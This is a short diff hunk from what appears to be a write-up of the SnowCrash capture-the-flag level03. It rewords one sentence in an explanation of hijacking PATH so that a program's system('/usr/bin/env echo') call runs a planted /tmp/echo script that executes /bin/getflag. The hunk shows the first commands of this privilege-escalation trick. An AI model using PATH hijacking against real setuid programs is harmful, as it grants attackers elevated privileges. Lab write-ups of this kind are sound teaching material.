@@ -34,7 +34,7 @@ system("/usr/bin/env echo Exploit me"Exploit me
 
 As we can see, there is a system call with /usr/bin/env of the echo file. We only have to modify our PATH env to run an echo program. We will run /bin/getflag to get the flag of the next level.
 
-So we will do the following step:
+So we will execute the following commands:
 ```bash
 level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
 level03@SnowCrash:~$ chmod 755 /tmp/echo
